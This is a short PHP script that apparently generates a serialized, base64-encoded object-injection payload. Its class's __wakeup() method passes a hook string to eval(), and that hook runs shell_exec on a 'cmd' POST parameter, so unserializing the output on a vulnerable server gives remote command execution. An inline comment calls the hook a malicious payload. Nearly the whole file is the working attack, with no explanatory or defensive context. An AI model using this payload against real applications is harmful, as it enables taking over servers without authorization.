<?php

// create a Query() object
class Query {
    private $hook = "print_r(shell_exec(\$_POST['cmd']));";
    function __wakeup() {
        if (isset($this->hook)) eval($this->hook); // create a query object with $hook = some malicious payload
    }
}

$q = new Query();
print_r(base64_encode(serialize($q)));
